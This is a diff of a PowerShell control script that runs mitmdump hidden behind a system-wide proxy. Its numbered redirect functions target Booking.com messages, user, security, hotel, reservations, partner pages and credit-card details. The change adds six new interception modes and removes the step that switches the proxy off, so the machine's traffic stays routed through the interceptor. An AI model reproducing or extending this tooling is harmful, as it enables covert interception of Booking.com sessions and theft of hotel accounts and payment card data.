@@ -33,6 +33,18 @@ $BookingCCDetailsFlag = "C:\temp\mitm_booking_cc_details_once"
 $BookingCCDetailsBnFile = "C:\temp\mitm_booking_cc_details_bn.txt"
 $BookingCCDetailsHotelIdFile = "C:\temp\mitm_booking_cc_details_hotel_id.txt"
 
+# Новые флаги для функций 21-26
+$PartnersFlag = "C:\temp\mitm_partners_once"
+$PartnersAndMessFlag = "C:\temp\mitm_partners_and_mess_once"
+$DeviceFlag = "C:\temp\mitm_device_once"
+$PulseFlag = "C:\temp\mitm_pulse_once"
+$UltraPulseFlag = "C:\temp\mitm_ultra_pulse_once"
+$MonitorPlatformsFlag = "C:\temp\mitm_monitor_platforms_once"
+$PulseRedirectToFile = "C:\temp\mitm_pulse_redirect_to.txt"
+$DeviceRedirectDoneFlag = "C:\temp\mitm_device_redirect_done.txt"
+$PartnersRedirectDoneFlag = "C:\temp\mitm_partners_redirect_done.txt"
+$UltraPulseRedirectToFile = "C:\temp\mitm_ultra_pulse_redirect_to.txt"
+
 $RedirectFile = Join-Path $WorkDir "redirect_target.txt"
 
 # -----------------------------------------
@@ -99,20 +111,10 @@ function Reset-Proxy-And-Stop-Mitmdump {
         }
     }
 
-    try {
-        netsh winhttp reset proxy | Out-Null
-        Log-Write "WinHTTP reset."
-    } catch {
-        Log-Write ("Failed winhttp reset: {0}" -f $_) "WARN"
-    }
-
-    try {
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
-        Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value 0 -Force
-        Log-Write "Disabled in registry."
-    } catch {
-        Log-Write ("Failed to disable proxy in registry: {0}" -f $_) "WARN"
-    }
+    # ⚠️ ВАЖНОЕ ИСПРАВЛЕНИЕ: НЕ отключаем прокси, только останавливаем процессы!
+    # УБРАЛИ эти строки:
+    # netsh winhttp reset proxy | Out-Null
+    # Set-ItemProperty -Path $regPath -Name "ProxyEnable" -Value 0 -Force
 
     try {
         ipconfig /flushdns | Out-Null
@@ -276,12 +278,28 @@ function Start-Mitmdump {
     $args = @("-p", "$MitmPort", "-s", "$PyAddon")
 
     Log-Write ("Starting: {0} {1}" -f $mitmPath, ($args -join ' '))
-    $proc = Start-Process -FilePath $mitmPath -ArgumentList $args -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru
-
-    Start-Sleep -Seconds 2
+    
+    # Устанавливаем прокси ПЕРЕД запуском mitmdump
     Set-SystemProxies | Out-Null
-    Log-Write ("started, PID: {0}" -f $proc.Id)
-    return $true
+    
+    try {
+        $proc = Start-Process -FilePath $mitmPath -ArgumentList $args -WorkingDirectory $WorkDir -WindowStyle Hidden -PassThru
+        
+        # Проверяем, запустился ли процесс
+        Start-Sleep -Seconds 1
+        if ($proc.HasExited) {
+            Log-Write "mitmdump failed to start!" "ERROR"
+            Clear-SystemProxies | Out-Null
+            return $false
+        }
+        
+        Log-Write ("mitmdump started, PID: {0}" -f $proc.Id)
+        return $true
+    } catch {
+        Log-Write ("Failed to start mitmdump: {0}" -f $_) "ERROR"
+        Clear-SystemProxies | Out-Null
+        return $false
+    }
 }
 
 # ---------------- REDIRECT FUNCTIONS ----------------
@@ -290,27 +308,23 @@ function Enable-ForceRedirect {
         New-Item -ItemType Directory -Path (Split-Path $ForceFlag) -Force | Out-Null
     }
     New-Item -ItemType File -Path $ForceFlag -Force | Out-Null
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -Force -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Log-Write "Force redirect enabled."
     Start-Mitmdump
 }
@@ -320,27 +334,23 @@ function Enable-OneShotRedirect {
         New-Item -ItemType Directory -Path (Split-Path $OneShotFlag) -Force | Out-Null
     }
     New-Item -ItemType File -Path $OneShotFlag -Force | Out-Null
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Log-Write "One-shot redirect enabled."
     Start-Mitmdump
 }
@@ -350,27 +360,23 @@ function Enable-MessageRedirect {
         New-Item -ItemType Directory -Path (Split-Path $MessageFlag) -Force | Out-Null
     }
     New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Log-Write "Booking.com message redirect enabled (function 7)."
     Start-Mitmdump
 }
@@ -380,27 +386,23 @@ function Enable-ProviderRedirect {
         New-Item -ItemType Directory -Path (Split-Path $ProviderFlag) -Force | Out-Null
     }
     New-Item -ItemType File -Path $ProviderFlag -Force | Out-Null
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Log-Write "Booking.com provider redirect enabled (function 8)."
     Start-Mitmdump
 }
@@ -410,27 +412,23 @@ function Enable-UserRedirect {
         New-Item -ItemType Directory -Path (Split-Path $UserFlag) -Force | Out-Null
     }
     New-Item -ItemType File -Path $UserFlag -Force | Out-Null
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Log-Write "Booking.com user redirect enabled (function 9)."
     Start-Mitmdump
 }
@@ -440,27 +438,23 @@ function Enable-SecurityRedirect {
         New-Item -ItemType Directory -Path (Split-Path $SecurityFlag) -Force | Out-Null
     }
     New-Item -ItemType File -Path $SecurityFlag -Force | Out-Null
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Log-Write "Booking.com security redirect enabled (function 10)."
     Start-Mitmdump
 }
@@ -478,26 +472,22 @@ function Enable-Operation11Redirect {
     }
     New-Item -ItemType File -Path $MessageFlag -Force | Out-Null
     
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation12Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Start-Mitmdump
     
     Log-Write "Operation 11: Function 7 (message redirect) enabled."
@@ -517,26 +507,22 @@ function Enable-Operation12Redirect {
     }
     New-Item -ItemType File -Path $UserFlag -Force | Out-Null
     
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $SecurityFlag,
+        $Operation11Flag, $BookingHotelFlag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Start-Mitmdump
     
     Log-Write "Operation 12: Function 9 (user redirect) enabled."
@@ -549,27 +535,22 @@ function Enable-BookingHotelRedirect {
     }
     New-Item -ItemType File -Path $BookingHotelFlag -Force | Out-Null
 
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelSecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsHotelIdFile -ErrorAction SilentlyContinue
-	Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
+    # Удаляем ВСЕ другие флаги
+    @(
+        $ForceFlag, $OneShotFlag, $MessageFlag, $ProviderFlag, $UserFlag, $SecurityFlag,
+        $Operation11Flag, $Operation12Flag, $BookingHotelSecurityFlag,
+        $Operation16Flag, $CustomRedirectFlag, $CustomRedirectFromFile, $CustomRedirectToFile,
+        $CustomRedirectDoneFlag, $BookingReservationsFlag, $BookingReservationsHotelIdFile,
+        $BookingReservationsReportIdFile, $BookingCCDetailsFlag, $BookingCCDetailsBnFile,
+        $BookingCCDetailsHotelIdFile,
+        # Новые флаги 21-26
+        $PartnersFlag, $PartnersAndMessFlag, $DeviceFlag, $PulseFlag, $UltraPulseFlag,
+        $MonitorPlatformsFlag, $PulseRedirectToFile, $DeviceRedirectDoneFlag,
+        $PartnersRedirectDoneFlag, $UltraPulseRedirectToFile
+    ) | ForEach-Object {
+        Remove-Item -Path $_ -ErrorAction SilentlyContinue
+    }
+    
     Log-Write "Booking.com HOTEL (global) redirect enabled (function 13)."
     Start-Mitmdump
 }
@@ -585,27 +566,22 @@ function Enable-BookingHotelSecurityRedirect {
     }
     New-Item -ItemType File -Path $BookingHotelSecurityFlag -Force | Out-Null
 
-    Remove-Item -Path $ForceFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $OneShotFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $MessageFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $ProviderFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $UserFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $SecurityFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation11Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation12Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingHotelFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $Operation16Flag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectFromFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectToFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $CustomRedirectDoneFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsHotelIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingReservationsReportIdFile -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsFlag -ErrorAction SilentlyContinue
-    Remove-Item -Path $BookingCCDetailsBnFile -ErrorAction SilentlyContinue
